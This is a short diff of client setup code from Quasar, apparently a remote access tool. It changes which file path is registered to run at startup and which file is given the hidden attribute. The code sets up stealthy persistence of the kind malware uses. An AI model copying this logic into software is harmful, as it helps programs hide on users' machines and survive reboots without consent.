@@ -16,14 +16,14 @@ namespace Quasar.Client.Setup
             if (Settings.STARTUP)
             {
                 var clientStartup = new ClientStartup();
-                clientStartup.AddToStartup(Application.ExecutablePath, Settings.STARTUPKEY);
+                clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
             }
 
             if (Settings.INSTALL && Settings.HIDEFILE)
             {
                 try
                 {
-                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
+                    File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
                 }
                 catch (Exception ex)
                 {
